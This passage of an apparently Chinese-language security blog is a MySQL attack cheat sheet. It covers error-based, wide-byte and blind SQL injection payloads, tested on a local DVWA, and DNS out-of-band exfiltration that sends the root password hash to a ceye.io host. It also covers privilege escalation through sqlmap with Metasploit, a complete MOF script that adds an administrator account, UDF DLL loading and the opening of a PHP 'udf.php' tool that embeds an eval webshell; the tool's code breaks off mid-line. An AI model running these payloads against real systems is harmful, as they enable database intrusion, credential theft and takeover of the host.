<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extractvalue() &#x2F;&#x2F;5.1.5</span><br><span class="line">and extractvalue(1,concat(0x5c,(select user())))</span><br><span class="line"></span><br><span class="line">select * from users where user_id&#x3D;1 and extractvalue(1,concat(0x3a,(select database())));</span><br><span class="line"></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;:dvwa&#39;</span><br></pre></td></tr></table></figure>

<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exp() &#x2F;&#x2F;5.5.5版本之后可以使用</span><br><span class="line"></span><br><span class="line">select host from user where user &#x3D; &#39;root&#39; and Exp(~(select * from (select version())a));</span><br></pre></td></tr></table></figure>

<h4 id="name-const"><a href="#name-const" class="headerlink" title="name_const"></a>name_const</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name_const &#x2F;&#x2F;支持老版本</span><br><span class="line"></span><br><span class="line">select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;</span><br></pre></td></tr></table></figure>

<h4 id="几何函数"><a href="#几何函数" class="headerlink" title="几何函数"></a>几何函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">geometrycollection(),multipoint(),polygon(),multipolygon(),linestring(),multilinestring()</span><br><span class="line"></span><br><span class="line">select multipoint((select * from (select * from (select * from (select version())a)b)c));</span><br></pre></td></tr></table></figure>

<h2 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h2><p>参考：</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMzk5MiN0b2MtMw==">https://xz.aliyun.com/t/3992#toc-3<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><strong>MYSQL client链接编码的锅</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%character%&#39;</span><br></pre></td></tr></table></figure>

<p>由于编码不一致，导致的问题，主要是汉字占用了3个字节。关键字<code>%df</code>，当客户端连接编码设置为GBK的时候 与php进行交互的时候就会出现字符转换 导致单引号逃逸的问题。<br>    测试payload: <code>index.php?id=%df%27</code></p>
<p><strong>MYSQL iconv函数 mb_convert_encoding函数的锅</strong><br> 借用先知: <code>$id =iconv(&#39;GBK&#39;,&#39;UTF-8&#39;, $id)</code><br> <code>%df%27===(addslashes)===&gt;%df%5c%27===(iconv)===&gt;%e5%5c%5c%27</code><br> 其实就是 utf8 -&gt; gbk -&gt;utf-8 低位的%5c 也就是反斜杠干掉了转义单引号的反斜杠。</p>
<p><strong>Big5编码导致的宽字节注入</strong></p>
<p>猜测代码: <code>iconv(&#39;utf-8&#39;,&#39;BIG5&#39;,$_GET[&#39;id&#39;])</code><br> payload构造同上: 功’ -&gt; addsalshes -&gt; 功&#39; -&gt; iconv -&gt; %A5%5C%5C%27-&gt;¥&#39; 逃逸单引号<br> <code>%E8%B1%B9&#39;</code></p>
<h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><p>这里包含了Bool和Time类型</p>
<h3 id="开始注入-1"><a href="#开始注入-1" class="headerlink" title="开始注入"></a>开始注入</h3><blockquote>
<p>本地搭建的DVWA，在线的显性注入出了点问题，就本地搭建了。</p>
<p>这里测试使用了<code>=</code>号，为了直观，真实环境协同使用<code>&lt;</code>、<code>&gt;</code>快速判断</p>
<p>仔细观察通过长度和返回时间两种方式，下文对时间的不过多说了</p>
</blockquote>
<ul>
<li>判断数据库名长度</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 第一种，通过长度</span><br><span class="line">and length(database())&#x3D;4-- -   # 正常返回 说明当前用户名长度为 14 ，我这里是：root@localhost</span><br><span class="line"></span><br><span class="line"># 第二种通过返回时间判断，如果网络较差，建议多设置几秒。</span><br><span class="line">and if(length(database())&#x3D;4,sleep(5),1)-- -  # 如果数据库名长度为4则延时5秒返回结果</span><br></pre></td></tr></table></figure>

<ul>
<li>判断数据库名称</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 只能挨个字符判断,这里值猜不到数据库名的情况下，挨个字符判断</span><br><span class="line"># 第一种，通过ASCII值判断，判断正确返回正常页面，</span><br><span class="line">and ascii(substr(database(),1,1))&#x3D;100-- - # 第1个字符开始，1为截取字符长度</span><br><span class="line"></span><br><span class="line"># 第二种，通过返回时间</span><br><span class="line">and if(ascii(substr(database(),1,1))&#x3D;100,sleep(3),1)-- -</span><br></pre></td></tr></table></figure>

<ul>
<li>判断数据库表名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 猜表的数量，因为不知道数据库结构，只能慢慢猜，这个根据自己需求，非必须</span><br><span class="line">and (select count(table_name) from information_schema.tables where table_schema &#x3D;database())&#x3D;2-- -  # 判断表的数量为2</span><br><span class="line"># 基于返回时间</span><br><span class="line">and if((select count(table_name) from information_schema.tables where table_schema &#x3D;database())&#x3D;2, sleep(3),1)-- -</span><br><span class="line"></span><br><span class="line"># 猜表名的长度,这里注意是length((exp1))&#x3D;9,用括号将查询内容括起来</span><br><span class="line">and length((select table_name from information_schema.tables where table_schema &#x3D;database() limit 0,1))&#x3D;9-- -</span><br><span class="line"># 通过limit 1,1遍历表名长度， limit n,1   n从0开始，0表示第一个表</span><br><span class="line"></span><br><span class="line"># 基于时间的不在写了。</span><br><span class="line"></span><br><span class="line"># 猜第一个表的第一个字母，这里substr((exp1),1,1)&#x3D;103,用括号将查询内容括起来</span><br><span class="line">and ascii(substr((select table_name from information_schema.tables where table_schema &#x3D;database() limit 0,1),1,1))&#x3D;103-- -</span><br><span class="line"># 上语句简析：ascii( substr(exp1,1,1) )&#x3D;103</span><br><span class="line"># exp1 &#x3D; select table_name from information_schema.tables where table_schema &#x3D;database() limit 0,1</span><br><span class="line"></span><br><span class="line"># 基于时间的不再写了。</span><br></pre></td></tr></table></figure>

<blockquote>
<p>通过<code>limit</code>控制查询的表，通过<code>substr</code>截取表名字符串，挨个判断值</p>
</blockquote>
<ul>
<li>判断字段名</li>
</ul>
<blockquote>
<p>原理和判断表名一样</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 首先来个嵌套的，这里不用获取表名，可以直接得到字段长度、值。</span><br><span class="line"># 这里获取的是第一个表的第一个字段的长度</span><br><span class="line"># 通过第二个limit来控制查询字段。</span><br><span class="line">and length((select column_name from information_schema.columns where table_name&#x3D;(select table_name from information_schema.tables where table_schema &#x3D;database() limit 0,1)limit 0,1))&#x3D;10-- -</span><br><span class="line"></span><br><span class="line"># 第二种，根据前面的表名，使用如下语句，十六进制数据为：表名的十六进制。</span><br><span class="line">and length((select column_name from information_schema.columns where table_name&#x3D;0x6775657374626F6F6B limit 0,1))&#x3D;10-- -</span><br><span class="line"></span><br><span class="line"># 基于时间的就不再写了。也就是 if(length()&#x3D;2,sleep(2),1)这种</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 求值第一个表的第一个字段的第一个字母</span><br><span class="line">and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;0x6775657374626F6F6B limit 0,1),1,1))&#x3D;99-- -</span><br><span class="line"></span><br><span class="line"># 嵌套求第一个表的第一个字段的第一个字母</span><br><span class="line">and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;(select table_name from information_schema.tables where table_schema &#x3D;database() limit 0,1)limit 0,1),1,1))&#x3D;99-- -</span><br></pre></td></tr></table></figure>

<ul>
<li>判断字段内容</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 其实有了表名和字段名，可以直接查询的。先获取长度再获取值。</span><br><span class="line">and length((select comment_id from guestbook))&#x3D;1-- -</span><br><span class="line"></span><br><span class="line"># 获取值</span><br><span class="line">and ascii(substr((select comment_id from guestbook),1,1))&#x3D;49-- -</span><br><span class="line"># 基于时间的</span><br><span class="line">and if(ascii(substr((select comment_id from guestbook),1,1))&#x3D;49,sleep(3),1)-- -</span><br></pre></td></tr></table></figure>

<blockquote>
<p>到此，盲注的基本方法已经完成</p>
</blockquote>
<h3 id="DNSLOG"><a href="#DNSLOG" class="headerlink" title="DNSLOG"></a>DNSLOG</h3><p>有时候注入发现并没有回显，也不能利用时间盲注，那么就可以利用带外通道，也就是利用其他协议或者渠道，如http请求、DNS解析、SMB服务等将数据带出。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,( SELECT DATABASE() ),&#39;.xx.xx\\x));</span><br><span class="line"></span><br><span class="line"># ceye</span><br><span class="line">SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(SELECT password FROM mysql.user WHERE user&#x3D;&#39;root&#39; LIMIT 1),&#39;.xxx.ceye.io\\abc&#39;));</span><br></pre></td></tr></table></figure>

<p><strong>条件：</strong></p>
<ul>
<li>mysql.ini 中 secure_file_priv 必须为空</li>
</ul>
<p>mysql 新版本下secure-file-priv字段 ： secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出</span><br><span class="line"></span><br><span class="line">当secure_file_priv的值为&#x2F;tmp&#x2F; ，表示限制mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下</span><br><span class="line"></span><br><span class="line">当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</span><br></pre></td></tr></table></figure>

<ul>
<li>从payload看出load_file的路径是windows下的UNC路径，所以mysql带外注入只能发生在windows机器上</li>
</ul>
<h1 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h1><h2 id="SQLMap-MSF"><a href="#SQLMap-MSF" class="headerlink" title="SQLMap+MSF"></a>SQLMap+MSF</h2><p>已知用户名密码情况下，利用Sqlmap结合MSF进行提权。(需要对目录有写权限)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -d mysql:&#x2F;&#x2F;admin:123456@10.52.95.209:3306&#x2F;mysql --os-pwn --msf-path &#x2F;opt&#x2F;metasploit-framework&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p><strong>简介：</strong>mof是windows系统的一个文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做”托管对象格式”其作用是每隔五秒就会去监控进程创建和死亡。其就是用又了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p>
<p><strong>必备命令</strong></p>
<p>所需要的SQL语句<code>select load_file(&#39;D:\wamp\xishaonian.mof&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;;</code></p>
<p><strong>必备脚本</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> # pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line"> EventNamespace &#x3D; &quot;Root\\Cimv2&quot;; </span><br><span class="line"> Name  &#x3D; &quot;filtP2&quot;; </span><br><span class="line"> Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">         &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">         &quot;And TargetInstance.Second &#x3D; 5&quot;; </span><br><span class="line"> QueryLanguage &#x3D; &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line"> Name &#x3D; &quot;consPCSV2&quot;; </span><br><span class="line"> ScriptingEngine &#x3D; &quot;JScript&quot;; </span><br><span class="line"> ScriptText &#x3D; </span><br><span class="line"> &quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin &#x2F;add\&quot;)&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line"> Consumer   &#x3D; $Consumer; </span><br><span class="line"> Filter &#x3D; $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>这里的前提是已经上传了udf.dll,如果没有写入权限，emmm,,,我不肥了。。</p>
<p>注意事项：</p>
<ul>
<li><p>mysql&lt;5.2版本的将.dll文件导入到c:\windows 或者c:\windows\system32 目录下。</p>
</li>
<li><p>mysql&gt;5.2版本的将.dll文件导入到/MySQL/lib/plugin/ mysql安装目录下。</p>
</li>
<li><p>如果报错内容为：<code>The MySQL server is running with the --secure-file-priv option so it cannot execute this statemen</code>请在MySQL配置文件<code>my.ini</code>文件的<code>[mysqld]</code>选项内加入<code>secure_file_priv =</code>然后重启mysql服务。。</p>
</li>
<li><p>如果报错<code>--secure-file-priv</code> 又无法修改<code>my.ini</code>，则没有办法。</p>
</li>
</ul>
<p>详情参考：<a href="https://segmentfault.com/a/1190000009333563"><code>--secure-file-priv 特性</code></a></p>
<h3 id="手动UDF提权"><a href="#手动UDF提权" class="headerlink" title="手动UDF提权"></a>手动UDF提权</h3><h4 id="制作udf-dll"><a href="#制作udf-dll" class="headerlink" title="制作udf.dll"></a>制作udf.dll</h4><p>SQLMAP下路径：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/usr/local/Cellar/sqlmap/<span class="number">1.4</span><span class="number">.3</span>/libexec/data/udf/mysql/windows/<span class="number">64</span></span><br><span class="line">/usr/local/Cellar/sqlmap/<span class="number">1.4</span><span class="number">.3</span>/libexec/extra/cloak</span><br><span class="line"></span><br><span class="line">python2 cloak.py -d -i lib_mysqludf_sys.dll_</span><br><span class="line"><span class="comment"># 即可在当前目录下生成  lib_mysqludf_sys.dll</span></span><br></pre></td></tr></table></figure>

<h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用 1"></a>利用 1</h4><ul>
<li>查看plugin目录<code>show variables like &#39;%plugin%&#39;;</code></li>
</ul>
<p>提示：由于MySQL&gt;5.2版本后，在其安装目录的lib目录下没有 plugin 目录，所以，我们得新建这个目录，并且将我们的 udf.dll 文件放入 plugin目录下，我们执行下面命令，使用NTFS ADS流创建 plugin</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &#39;xxxxxx&#39; into dumpfile &#39;C:\\Program\ Files\\MySQL\\MySQL\ Server\ 5.4\\lib\\plugin::$INDEX_ALLOCATION&#39;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>导出UDF(也即是将之前生成的lib_mysqludf_sys.dll上传到目标文件夹)</p>
</li>
<li><p>创建函数：<code>CREATE FUNCTION shell RETURNS STRING SONAME &#39;lib_mysqludf_sys.dll&#39;</code></p>
</li>
</ul>
<p>注意：如果创建函数时报错，请根据<code>lib_mysqludf_sys.dll</code>中的函数创建。</p>
<h4 id="利用2"><a href="#利用2" class="headerlink" title="利用2"></a>利用2</h4><p>利用交互式的SHELL，mysql -uroot -pxxx无法继续交互，需要参数e解决这个问题。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;create table a (cmd LONGBLOB);&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;insert into a (cmd) values</span><br><span class="line">(hex(load_file(&#39;C:\\xxxx\\xxxx.dll&#39;)));&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;SELECT unhex(cmd) FROM a INTO DUMPFILE &#39;c:\\windows\\system32\\xxxx.dll&#39;;&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;CREATE FUNCTION shell RETURNS STRING SONAME &#39;udf.dll&#39;&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;select shell(&#39;cmd&#39;,&#39;C:\\xxxx\\xxx\\xxxxx.exe&#39;);&quot;</span><br></pre></td></tr></table></figure>

<p>如没有指定database，将会出现错误，而使用UNION，将不会有回显，一定出现问<br>题，将会很难定位，故选择以mysql.x的方式指定。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -uroot -pXXXXXX -e &quot;create table mysql.a (cmd LONGBLOB);&quot;</span><br><span class="line">mysql -uroot -pXXXXXX -e &quot;insert into mysql.a (cmd) values</span><br><span class="line">(hex(load_file(&#x27;D:\\XXXXXXXXXX\\mysql5\\lib\\plugin\\u.dll&#x27;)));&quot;</span><br><span class="line">mysql -uroot -pXXXXXX -e &quot;SELECT unhex(cmd) FROM mysql.a INTO DUMPFILE</span><br><span class="line">&#x27;D:/XXXXXXXXXX/mysql5/lib/plugin/uu.dll&#x27;;&quot;</span><br><span class="line">mysql -uroot -pXXXXXX -e &quot;CREATE FUNCTION shell RETURNS STRING SONAME &#x27;uu.dll&#x27;&quot;</span><br><span class="line">mysql -uroot -pXXXXXX -e &quot;select shell(&#x27;cmd&#x27;,&#x27;whoami&#x27;);&quot; </span><br></pre></td></tr></table></figure>

<h3 id="UDF提权大马"><a href="#UDF提权大马" class="headerlink" title="UDF提权大马"></a>UDF提权大马</h3><p>可以使用<code>T00ls udf.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//t00ls...................</span></span><br><span class="line">session_start();<span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;T00ls UDF.PHP&lt;/title&gt;</span><br><span class="line">&lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">input&#123;font:<span class="number">12</span>px Arial,Tahoma;background:<span class="comment">#fff;border: 1px solid #666;padding:2px;height:22px;&#125;</span></span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">outfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	document.getElementById(<span class="string">&quot;sql2&quot;</span>).value= unescape(<span class="string">&quot;select%20%27%3C%3Fphp%20eval%28%24_POST%5B%5C%27pass%5C%27%5D%29%3F%3E%27%20into%20outfile%20%27d%3A%5C%5Cninty.php%27&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	document.getElementById(<span class="string">&quot;sql2&quot;</span>).value = unescape(<span class="string">&quot;select%20load_file%28%27c%3A%5C%5Cboot.ini%27%29&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;action&#x27;</span>]))</span><br><span class="line">	$action = $_REQUEST[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	$action = <span class="string">&#x27;vConn&#x27;</span>;</span><br><span class="line"><span class="keyword">switch</span> ($action) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;vConn&#x27;</span>:</span><br><span class="line">		vConn();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;conn&#x27;</span>:</span><br><span class="line">		conn();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;exec&#x27;</span>:</span><br><span class="line">		execsql();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;install&#x27;</span>:</span><br><span class="line">		install();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;copy&#x27;</span>:</span><br><span class="line">		cp();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;cplug&#x27;</span>:</span><br><span class="line">		cplug();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;logout&#x27;</span>:</span><br><span class="line">		logout();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;func&#x27;</span>:</span><br><span class="line">		func();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">vConn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;by ninty http://www.t00ls.net/&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;table&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;conn&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;tr&gt;&lt;td&gt;ip:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;host&quot; value=&quot;localhost&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;uid:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; value=&quot;root&quot; name=&quot;uid&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;pwd:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;pwd&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;db:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;db&quot; value=&quot;mysql&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;input type=&quot;submit&quot;/&gt;&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/form&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$conn = conn(<span class="literal">false</span>);</span><br><span class="line">	mysql_select_db(<span class="string">&#x27;mysql&#x27;</span>,$conn);</span><br><span class="line">	mysql_query(<span class="string">&#x27;CREATE TABLE `func` ( `name` char(64) collate utf8_bin NOT NULL default \&#x27;\&#x27;, `ret` tinyint(1) NOT NULL default \&#x27;0\&#x27;, `dl` char(128) collate utf8_bin NOT NULL default \&#x27;\&#x27;, `type` enum(\&#x27;function\&#x27;,\&#x27;aggregate\&#x27;) character set utf8 NOT NULL, PRIMARY KEY (`name`) ) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=\&#x27;User defined functions\&#x27;&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (mysql_errno($conn) != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> mysql_error() . <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;Create mysql.func success !&#x27;</span>;</span><br><span class="line">	mysql_close($conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">conn</span>(<span class="params">$close = <span class="literal">true</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">		$host = $_SESSION[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">		$uid = $_SESSION[<span class="string">&#x27;uid&#x27;</span>];</span><br><span class="line">		$pwd = $_SESSION[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line">		$db = $_SESSION[<span class="string">&#x27;db&#x27;</span>];</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$host = $_POST[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">		$uid = $_POST[<span class="string">&#x27;uid&#x27;</span>];</span><br><span class="line">		$pwd = $_POST[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line">		$db = $_POST[<span class="string">&#x27;db&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	$conn = mysql_connect($host,$uid,$pwd);</span><br><span class="line">	<span class="keyword">if</span> (!$conn) &#123;</span><br><span class="line">		<span class="keyword">echo</span> mysql_error().<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">		vConn();</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125; </span><br><span class="line">	mysql_select_db($db,$conn);</span><br><span class="line">	<span class="keyword">if</span> (mysql_errno($conn) != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> mysql_error().<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">		vConn();</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	$_SESSION[<span class="string">&#x27;host&#x27;</span>] = $host;</span><br><span class="line">	$_SESSION[<span class="string">&#x27;uid&#x27;</span>] = $uid;</span><br><span class="line">	$_SESSION[<span class="string">&#x27;pwd&#x27;</span>] = $pwd;</span><br><span class="line">	$_SESSION[<span class="string">&#x27;db&#x27;</span>] = $db;</span><br><span class="line">	<span class="comment">//mysql_query(&#x27;set names utf8&#x27;);</span></span><br><span class="line">	showM($conn,$close);</span><br><span class="line">	<span class="keyword">return</span> $conn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;uid&#x27;</span>]);</span><br><span class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;pwd&#x27;</span>]);</span><br><span class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;db&#x27;</span>]);</span><br><span class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;notsame&#x27;</span>]);</span><br><span class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;over51&#x27;</span>]);</span><br><span class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;plugindir&#x27;</span>]);</span><br><span class="line">	$url = $_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>]; </span><br><span class="line">	$filename = end(explode(<span class="string">&#x27;/&#x27;</span>,$url));  </span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;location.href = &quot;&#x27;</span>.$filename.<span class="string">&#x27;?rn=&quot;+Math.random()&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showM</span>(<span class="params">&amp;$conn,$close = <span class="literal">true</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;b&gt;t00ls UDF.PHP&lt;/b&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;logout&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Logout&quot;&gt;&lt;/form&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;div style=&quot;border:solid 1px #333;background-color:#999;padding:4px&quot;&gt;&#x27;</span>;</span><br><span class="line">	$sql = <span class="string">&#x27;select concat(\&#x27;&lt;b&gt;user()&lt;/b&gt;:\&#x27;,user()) as m union select concat(\&#x27;&lt;b&gt;database():&lt;/b&gt;\&#x27;,database()) union select concat(\&#x27;&lt;b&gt;datadir&lt;/b&gt;:\&#x27;,@@datadir) union select concat(\&#x27;&lt;b&gt;basedir&lt;/b&gt;:\&#x27;,@@basedir) union select concat(\&#x27;&lt;b&gt;version()&lt;/b&gt;:\&#x27;,version()) ;&#x27;</span>;</span><br><span class="line">	$meta = mysql_query($sql,$conn);</span><br><span class="line">	$tmp = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> ($row = mysql_fetch_array($meta,MYSQL_ASSOC)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> $row[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span> ($tmp == <span class="number">1</span>) &#123;</span><br><span class="line">			$tmp = <span class="number">2</span>;</span><br><span class="line">			$h = substr($row[<span class="string">&#x27;m&#x27;</span>],strpos($row[<span class="string">&#x27;m&#x27;</span>],<span class="string">&#x27;@&#x27;</span>)+<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">if</span> ($h != <span class="string">&#x27;localhost&#x27;</span>) &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&#x27; &lt;b&gt;&lt;i&gt;&lt;font color=green&gt;[web and db is not the same 